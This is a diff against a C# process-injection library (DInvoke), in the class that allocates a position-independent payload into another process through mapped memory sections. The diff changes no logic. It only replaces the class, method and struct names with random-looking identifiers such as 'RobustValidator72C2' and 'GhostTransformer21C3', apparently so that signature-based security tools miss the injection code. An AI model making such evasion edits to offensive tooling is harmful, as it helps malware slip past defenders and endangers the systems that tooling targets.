@@ -85,7 +85,7 @@ namespace DInvokeResolver.DInvoke.Injection
     /// <summary>
     /// Allocates a payload to a target process using locally-written, remotely-copied shared memory sections.
     /// </summary>
-    public class SectionMapAlloc : AllocationTechnique
+    public class RobustValidator72C2 : AllocationTechnique
     {
         // Publically accessible options
 
@@ -160,7 +160,7 @@ namespace DInvokeResolver.DInvoke.Injection
         /// <param name="Process">The target process.</param>
         /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
         /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress)
+        public IntPtr DynamicProcessorB8D3(PICPayload Payload, Process Process, IntPtr PreferredAddress)
         {
             // Get a convenient handle for the target process.
             IntPtr procHandle = Process.Handle;
@@ -202,7 +202,7 @@ namespace DInvokeResolver.DInvoke.Injection
         /// <param name="size">Max size of the Section.</param>
         /// <param name="allocationAttributes">Section attributes (eg. Win32.WinNT.SEC_COMMIT).</param>
         /// <returns></returns>
-        private static IntPtr CreateSection(ulong size, uint allocationAttributes)
+        private static IntPtr OptimizedTransformer001B(ulong size, uint allocationAttributes)
         {
             // Create a pointer for the section handle
             IntPtr SectionHandle = new IntPtr();
@@ -235,7 +235,7 @@ namespace DInvokeResolver.DInvoke.Injection
         /// <param name="addr">Optional parameter to specify the address of where to map the view.</param>
         /// <param name="sizeData">Size of the view to map. Must be smaller than the max Section size.</param>
         /// <returns>A struct containing address and size of the mapped view.</returns>
-        public static SectionDetails MapSection(IntPtr procHandle, IntPtr sectionHandle, uint protection, IntPtr addr, ulong sizeData)
+        public static SectionDetails GhostTransformer21C3(IntPtr procHandle, IntPtr sectionHandle, uint protection, IntPtr addr, ulong sizeData)
         {
             // Copied so that they may be passed by reference but the original value preserved
             IntPtr baseAddr = addr;
@@ -263,7 +263,7 @@ namespace DInvokeResolver.DInvoke.Injection
         /// <summary>
         /// Holds the data returned from NtMapViewOfSection.
         /// </summary>
-        public struct SectionDetails
+        public struct RobustExecutor47F9
         {
             public IntPtr baseAddr;
             public ulong size;
